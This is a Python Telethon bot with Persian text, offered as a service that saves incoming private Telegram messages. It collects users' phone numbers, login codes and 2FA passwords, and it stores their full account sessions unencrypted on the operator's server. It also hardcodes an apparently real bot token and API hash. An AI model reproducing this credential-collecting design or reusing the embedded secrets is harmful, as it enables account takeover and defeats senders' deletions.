from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
from telethon.sessions import StringSession, MemorySession
import asyncio
import os

# خواندن مقادیر از متغیرهای محیطی Railway
BOT_TOKEN = os.getenv("BOT_TOKEN", "9024595880:AAHT2b4wpWNu-gULwbrBj09AjNUDWZQUoLE")
API_ID = int(os.getenv("API_ID", 2040))
API_HASH = os.getenv("API_HASH", "b18441a1ff607e10a989891a5462e627")

# --- اتصال مستقیم به تلگرام (بدون پروکسی) ---
print("Connecting directly to Telegram...")
bot = TelegramClient(
    MemorySession(), API_ID, API_HASH
)
bot.start(bot_token=BOT_TOKEN)
print("Bot Connected Directly and Started!")

if not os.path.exists('users_data'):
    os.makedirs('users_data')

active_clients = {}
user_states = {}

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    user_states[user_id] = 'waiting_phone'
    await event.reply(
        "📱 **ربات ذخیره‌ساز پیام**\n\n"
        "لطفاً شماره موبایلت رو به صورت بین‌المللی بفرست:\n"
        "مثال: `98912XXXXXXX`\n\n"
        "⚠️ **مهم:** بعد از دریافت کد، آن را سریع (زیر ۱ دقیقه) بفرست تا منقضی نشود."
    )

@bot.on(events.NewMessage(pattern='/stop'))
async def stop(event):
    user_id = event.sender_id
    if user_id in active_clients:
        try:
            await active_clients[user_id].disconnect()
        except:
            pass
        del active_clients[user_id]
        
    if user_id in user_states:
        del user_states[user_id]
        
    session_path = f'users_data/user_{user_id}.session'
    if os.path.exists(session_path):
        try:
            os.remove(session_path)
        except:
            pass
            
    await event.reply("✅ ربات متوقف شد و اتصال حساب شما قطع شد.")

@bot.on(events.NewMessage)
async def handler(event):
    if event.message.text and event.message.text.startswith('/'):
        return
        
    user_id = event.sender_id
    text = event.message.text.strip() if event.message.text else ""
    state = user_states.get(user_id)
    
    if not state:
        return

    if state == 'waiting_phone':
        phone = text
        try:
            # اتصال کاربر بدون پروکسی
            user_client = TelegramClient(
                StringSession(), API_ID, API_HASH
            )
            await user_client.connect()
            active_clients[user_id] = user_client
            
            await event.reply("🔄 در حال ارسال کد...")
            sent = await user_client.send_code_request(phone)
            
            user_states[user_id] = {
                'state': 'waiting_code',
                'phone': phone,
                'hash': sent.phone_code_hash
            }
            
            await event.reply("✅ کد تأیید ارسال شد. لطفاً کد ۵ رقمی رو سریع بفرست:")
            
        except Exception as e:
            await event.reply(f"❌ خطا در ارسال کد: {str(e)}")
            if user_id in active_clients:
                try:
                    await active_clients[user_id].disconnect()
                except:
                    pass
                del active_clients[user_id]
            user_states.pop(user_id, None)

    elif isinstance(state, dict) and state.get('state') == 'waiting_code':
        code = text
        if user_id not in active_clients:
            await event.reply("❌ خطا! دوباره /start بزن.")
            return
            
        client = active_clients[user_id]
        phone = state['phone']
        phone_code_hash = state['hash']
        
        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            
        except PhoneCodeExpiredError:
            await event.reply("❌ **کد منقضی شده است!**\nلطفاً دوباره /start بزن و کد جدید را سریع‌تر وارد کن.")
            try:
                await client.disconnect()
            except:
                pass
            del active_clients[user_id]
            user_states.pop(user_id, None)
            return
            
        except SessionPasswordNeededError:
            user_states[user_id] = {'state': 'waiting_2fa'}
            await event.reply("🔐 حساب شما رمز دو مرحله‌ای (2FA) دارد.\nلطفاً رمز خود را بفرستید:")
            return
        except PhoneCodeInvalidError:
            await event.reply("❌ کد وارد شده نامعتبر است. دوباره تلاش کن.")
            return
        except Exception as e:
            await event.reply(f"❌ خطا در ورود: {str(e)}")
            return
            
        await _login_success(event, user_id, client)

    elif isinstance(state, dict) and state.get('state') == 'waiting_2fa':
        password = text
        if user_id not in active_clients:
            await event.reply("❌ خطا! دوباره /start بزن.")
            return
            
        client = active_clients[user_id]
        try:
            await client.sign_in(password=password)
        except Exception as e:
            await event.reply(f"❌ رمز اشتباه یا خطا: {str(e)}")
            return
            
        await _login_success(event, user_id, client)

async def _login_success(event, user_id, client):
    session_string = client.session.save()
    session_path = f'users_data/user_{user_id}.session'
    with open(session_path, 'w') as f:
        f.write(session_string)

    user_states.pop(user_id, None)
    await event.reply("✅ با موفقیت وارد شدی!\nحالا از این به بعد، **هر پیامی** که مخاطبینت بهت بفرستن، بلافاصله یه کپی ازش توی سیو مسیج خودت ذخیره میشه. اگه پاکش کنن، نسخه سیو مسیج سالم می‌مونه.")
    
    @client.on(events.NewMessage(incoming=True))
    async def save_immediately(msg_event):
        if not msg_event.is_private:
            return
            
        try:
            await client.forward_messages('me', msg_event.message)
            print(f"Message from {msg_event.sender_id} saved to Saved Messages.")
        except Exception as e:
            print(f"Could not forward: {e}")
            try:
                sender = await msg_event.get_sender()
                sender_name = getattr(sender, 'first_name', 'Unknown') if sender else 'Unknown'
                text_content = msg_event.text or "📷 [Media / File]"
                await client.send_message('me', f"⚠️ پیام از {sender_name}:\n\n{text_content}")
            except:
                pass

    asyncio.create_task(client.run_until_disconnected())

bot.run_until_disconnected()